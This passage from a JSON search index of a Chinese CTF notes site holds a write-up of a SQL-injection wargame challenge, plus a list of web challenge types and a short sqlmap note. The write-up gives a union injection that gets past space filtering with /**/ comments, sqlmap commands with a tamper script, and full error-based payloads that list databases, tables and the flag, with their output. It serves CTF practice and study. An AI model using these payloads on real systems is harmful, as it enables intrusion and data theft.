            "text": "简单sql注入3\n\n\n题目\n\n\n\n\nhttp://ctf5.shiyanbar.com/web/index_3.php\n\n\nflag\n\n\n到底过滤了什么东西？\n\n\n\n\n分类：sql injection\n\n\n流程图\n\n\n解题步骤\n\n\n参考文章\n\n\n无\n\n\n步骤\n\n\n0x1 直接猜测法\n\n\n\n\n\n\n在文本框输入1，提交，链接变成id=1\n\n\n\n\n\n\n在文件框输入1'，提交，报错，判断存在注入\n\n\n\n\n\n\n在文本框输入\ntest\n，提交，链接变成id=test，未返回错误，说明该注入类型为字符型注入\n\n\n\n\n\n\n使用一下语句：\n\n\n\n\n\n\nmysql\n   1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'t'='t\n\n\n返回\nHello!\n，由于 后台屏蔽了输出，所以只能采用盲注的办法，所以尝试采用sqlmap来实现\n\n\n0x2 标准注入\n\n\n\n\n使用sqlmap\n\n\n\n\nsqlmap.py -u \nhttp://ctf5.shiyanbar.com/web/index_3.php?id=1\n --dbs --tamper \nspace2comment.py\n --level 2 -v 3\n\n\n\n\n\n\n参数说明：\n\n\n--dbs 查找所有数据库\n\n\n\"space2comment.py\" 将空格转换成为/**/\n\n\n获取数据库数量的payload\n\n\n\n\n1'/**/AND/**/(SELECT/**/8427/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/IFNULL(CAST(COUNT(schema_name)/**/AS/**/CHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'IUDH'='IUDH\n\n\n\n\n返回值：\n\n\nDuplicate entry 'qbtfq3qzqpq1' for key 'group_key'\n\n\n注意其中的值\n3\n\n\n\n\n依次返回三个表的payload\n\n\n\n\n1'/**/AND/**/(SELECT/**/8165/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/0,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'xprA'='xprA\n[16:35:47] [INFO] retrieved: information_schema\n\n\n\n\n返回结果：\n\n\nDuplicate entry 'qbtfqinformation_schemaqzqpq1' for key 'group_key'\n\n\n[16:35:47] [PAYLOAD] 1'/**/AND/**/(SELECT/**/3904/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/1,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'YvjH'='YvjH\n[16:35:48] [INFO] retrieved: test\n\n\n\n\n[16:35:48] [PAYLOAD] 1'/**/AND/**/(SELECT/**/2380/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/2,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'huJK'='huJK\n[16:35:49] [INFO] retrieved: web1\n\n\n\n\n以后来研究一下，sqlmap是如何在避过\ndatabase()\n检测的情况下，实现查询数据库名的\n\n\n\n\n猜解表\n\n\n\n\nshell\n   sqlmap.py -u \"http://ctf5.shiyanbar.com/web/index_3.php?id=1\" -p \"id\" --thread 10 --dbms=mysql --tables -D \"web1\"   --tamper \"space2comment.py\" --level 2 -v 3\n\n\n\n\n[2 tables]\n+-------+\n| flag  |\n| web_1 |\n+-------+\n\n\n\n\n\n\n猜测列\n\n\n\n\nshell\n   sqlmap.py -u \"http://ctf5.shiyanbar.com/web/index_3.php?id=1\" -p \"id\" --thread 10 --dbms=mysql --columns -T \"flag-D \"web1\"   --tamper \"space2comment.py\" --level 2 -v 3\n\n\n\n\n| Column |\n+--------+\n| flag   | char(30) |\n| id     |\n\n\n\n\n\n\n猜解数据\n\n\n\n\nshell\n   sqlmap.py -u \"http://ctf5.shiyanbar.com/web/index_3.php?id=1\" -p \"id\" --thread 10 --dbms=mysql --columns -T \"flag\" -D \"web1\"   --tamper \"space2comment.py\" --level 2 -v 3\n\n\n\n\n+----------------------------+\n| flag                       |\n+----------------------------+\n| flag{Y0u_@r3_5O_dAmn_90Od} |\n+----------------------------+\n\n\n\n\n解答思路\n\n\n\n\n判断是否存在注入点\n\n\n判断注入类型\n\n\n判断后台的过滤机制\n\n\n关键字被过滤\n\n\n重复关键词（例如selectselect），不成功\n\n\n\n\n\n\n空格被过滤\n\n\n使用双重空格（使用+号替代也需要重复两次），不成功\n\n\n\n\n\n\n使用/**/替换空格，测试成功\n\n\n在有错误提示的情况下，可以有针对性的修改注入语句，如果没有错误提示，则需要遍历测试可能的绕过方式\n\n\n由于返现信息被屏蔽，只能采用盲注，这里使用了sqlmap\n\n\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5\n \n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "简单sql注入3"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_3/#sql3", 
            "text": "", 
            "title": "简单sql注入3"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_3/#_1", 
            "text": "http://ctf5.shiyanbar.com/web/index_3.php  flag  到底过滤了什么东西？   分类：sql injection", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_3/#_2", 
            "text": "", 
            "title": "流程图"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_3/#_3", 
            "text": "", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_3/#_4", 
            "text": "无", 
            "title": "参考文章"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_3/#_5", 
            "text": "", 
            "title": "步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_3/#0x1", 
            "text": "在文本框输入1，提交，链接变成id=1    在文件框输入1'，提交，报错，判断存在注入    在文本框输入 test ，提交，链接变成id=test，未返回错误，说明该注入类型为字符型注入    使用一下语句：    mysql\n   1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'t'='t  返回 Hello! ，由于 后台屏蔽了输出，所以只能采用盲注的办法，所以尝试采用sqlmap来实现", 
            "title": "0x1 直接猜测法"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_3/#0x2", 
            "text": "使用sqlmap   sqlmap.py -u  http://ctf5.shiyanbar.com/web/index_3.php?id=1  --dbs --tamper  space2comment.py  --level 2 -v 3   参数说明：  --dbs 查找所有数据库  \"space2comment.py\" 将空格转换成为/**/  获取数据库数量的payload   1'/**/AND/**/(SELECT/**/8427/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/IFNULL(CAST(COUNT(schema_name)/**/AS/**/CHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'IUDH'='IUDH  返回值：  Duplicate entry 'qbtfq3qzqpq1' for key 'group_key'  注意其中的值 3   依次返回三个表的payload   1'/**/AND/**/(SELECT/**/8165/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/0,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'xprA'='xprA\n[16:35:47] [INFO] retrieved: information_schema  返回结果：", 
            "title": "0x2 标准注入"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_3/#duplicate-entry-qbtfqinformation_schemaqzqpq1-for-key-group_key", 
            "text": "[16:35:47] [PAYLOAD] 1'/**/AND/**/(SELECT/**/3904/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/1,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'YvjH'='YvjH\n[16:35:48] [INFO] retrieved: test  [16:35:48] [PAYLOAD] 1'/**/AND/**/(SELECT/**/2380/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/2,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'huJK'='huJK\n[16:35:49] [INFO] retrieved: web1  以后来研究一下，sqlmap是如何在避过 database() 检测的情况下，实现查询数据库名的   猜解表   shell\n   sqlmap.py -u \"http://ctf5.shiyanbar.com/web/index_3.php?id=1\" -p \"id\" --thread 10 --dbms=mysql --tables -D \"web1\"   --tamper \"space2comment.py\" --level 2 -v 3   [2 tables]\n+-------+\n| flag  |\n| web_1 |\n+-------+    猜测列   shell\n   sqlmap.py -u \"http://ctf5.shiyanbar.com/web/index_3.php?id=1\" -p \"id\" --thread 10 --dbms=mysql --columns -T \"flag-D \"web1\"   --tamper \"space2comment.py\" --level 2 -v 3   | Column |\n+--------+\n| flag   | char(30) |\n| id     |    猜解数据   shell\n   sqlmap.py -u \"http://ctf5.shiyanbar.com/web/index_3.php?id=1\" -p \"id\" --thread 10 --dbms=mysql --columns -T \"flag\" -D \"web1\"   --tamper \"space2comment.py\" --level 2 -v 3   +----------------------------+\n| flag                       |\n+----------------------------+\n| flag{Y0u_@r3_5O_dAmn_90Od} |\n+----------------------------+", 
            "title": "Duplicate entry 'qbtfqinformation_schemaqzqpq1' for key 'group_key'"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_3/#_6", 
            "text": "判断是否存在注入点  判断注入类型  判断后台的过滤机制  关键字被过滤  重复关键词（例如selectselect），不成功    空格被过滤  使用双重空格（使用+号替代也需要重复两次），不成功    使用/**/替换空格，测试成功  在有错误提示的情况下，可以有针对性的修改注入语句，如果没有错误提示，则需要遍历测试可能的绕过方式  由于返现信息被屏蔽，只能采用盲注，这里使用了sqlmap", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_3/#_7", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_3/#_8", 
            "text": "TODO    判断题目特征： web   php   md5     设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/web_summary/", 
            "text": "WEB总结\n\n\n题目类型\n\n\nsql注入\n\n\nsql注入\n \n宽字节注入\n \n)匹配\n \nhtmlentities绕过\n \n嵌套双重绕过\n \n重复绕过\n \nsqlmap\n \n\n\n代码审计\n\n\n代码审计\n \nphp代码审计\n \nphp绕过\n \nphp弱类型比较\n \nphp逻辑漏洞\n \nphp函数漏洞\n \nphp代码运行\n \n变量覆盖\n\n\n文件包含\n\n\n文件包含\n \nphp本地包含\n \n\n\nhttp绕过\n\n\nhttp绕过\n \ncookie绕过\n \nReferer绕过\n \nuseragent绕过\n\n\n信息收集\n\n\n信息收集\n \n源代码查看\n \n响应头查看\n \n目录遍历\n \n异常script包含\n \n文件或地址访问\n \n信息联想\n \nurl地址信息提取\n\n\n上传漏洞\n\n\n上传漏洞\n \n0x00截断\n \ncontent-type\n \nfilename\n \n\n\njavascript\n\n\njavascript\n \naaencode\n \njsfuck\n\n\n访问控制\n\n\n访问控制\n \nmaxlength\n \n\n\nweb木马\n\n\nweb木马\n \nphp一句话\n\n\n中间件漏洞\n\n\n中间件漏洞\n \napache伪静态\n\n\n流程\n\n\n收集信息\n\n\n提交数据\n\n\n提交flag\n\n\n流程图\n\n\ngraph LR\nA[收集信息] --\n B{是否收集到新的信息?}\nB --\n |是| D[存入数据库]\nD --\n E[尝试直接提交参数]\nE --\n F{是否得到了flag}\nF --\n |是| H[提交flag]\nF --\n |否| A\nB --\n |否| A", 
            "title": "WEB总结"
        }, 
        {
            "location": "/wargame/web/web_summary/#web", 
            "text": "", 
            "title": "WEB总结"
        }, 
        {
            "location": "/wargame/web/web_summary/#_1", 
            "text": "", 
            "title": "题目类型"
        }, 
        {
            "location": "/wargame/web/web_summary/#sql", 
            "text": "sql注入   宽字节注入   )匹配   htmlentities绕过   嵌套双重绕过   重复绕过   sqlmap", 
            "title": "sql注入"
        }, 
        {
            "location": "/wargame/web/web_summary/#_2", 
            "text": "代码审计   php代码审计   php绕过   php弱类型比较   php逻辑漏洞   php函数漏洞   php代码运行   变量覆盖", 
            "title": "代码审计"
        }, 
        {
            "location": "/wargame/web/web_summary/#_3", 
            "text": "文件包含   php本地包含", 
            "title": "文件包含"
        }, 
        {
            "location": "/wargame/web/web_summary/#http", 
            "text": "http绕过   cookie绕过   Referer绕过   useragent绕过", 
            "title": "http绕过"
        }, 
        {
            "location": "/wargame/web/web_summary/#_4", 
            "text": "信息收集   源代码查看   响应头查看   目录遍历   异常script包含   文件或地址访问   信息联想   url地址信息提取", 
            "title": "信息收集"
        }, 
        {
            "location": "/wargame/web/web_summary/#_5", 
            "text": "上传漏洞   0x00截断   content-type   filename", 
            "title": "上传漏洞"
        }, 
        {
            "location": "/wargame/web/web_summary/#javascript", 
            "text": "javascript   aaencode   jsfuck", 
            "title": "javascript"
        }, 
        {
            "location": "/wargame/web/web_summary/#_6", 
            "text": "访问控制   maxlength", 
            "title": "访问控制"
        }, 
        {
            "location": "/wargame/web/web_summary/#web_1", 
            "text": "web木马   php一句话", 
            "title": "web木马"
        }, 
        {
            "location": "/wargame/web/web_summary/#_7", 
            "text": "中间件漏洞   apache伪静态", 
            "title": "中间件漏洞"
        }, 
        {
            "location": "/wargame/web/web_summary/#_8", 
            "text": "", 
            "title": "流程"
        }, 
        {
            "location": "/wargame/web/web_summary/#_9", 
            "text": "", 
            "title": "收集信息"
        }, 
        {
            "location": "/wargame/web/web_summary/#_10", 
            "text": "", 
            "title": "提交数据"
        }, 
        {
            "location": "/wargame/web/web_summary/#flag", 
            "text": "", 
            "title": "提交flag"
        }, 
        {
            "location": "/wargame/web/web_summary/#_11", 
            "text": "graph LR\nA[收集信息] --  B{是否收集到新的信息?}\nB --  |是| D[存入数据库]\nD --  E[尝试直接提交参数]\nE --  F{是否得到了flag}\nF --  |是| H[提交flag]\nF --  |否| A\nB --  |否| A", 
            "title": "流程图"
        }, 
        {
            "location": "/web/sqlmap_learning/", 
            "text": "sqlmap wiki学习\n\n\nTechniques\n\n\n\n\nBoolean-based blind\n  \n\n\n\n\n通过判断返回true或者false来猜测数据库名、表名等；\n\n\n参考链接：[\nDetailed] Boolean Based Blind Injection [Tutorial]\n \n\n\n\n\nStacked queries\n \n\n\n\n\n参考链接：http://www.sqlinjection.net/stacked-queries/", 
            "title": "Sqlmap learning"
        }, 
        {
            "location": "/web/sqlmap_learning/#sqlmap-wiki", 
            "text": "", 
            "title": "sqlmap wiki学习"
        }, 
        {
            "location": "/web/sqlmap_learning/#techniques", 
            "text": "Boolean-based blind      通过判断返回true或者false来猜测数据库名、表名等；  参考链接：[ Detailed] Boolean Based Blind Injection [Tutorial]     Stacked queries     参考链接：http://www.sqlinjection.net/stacked-queries/", 
            "title": "Techniques"
        }
    ]
}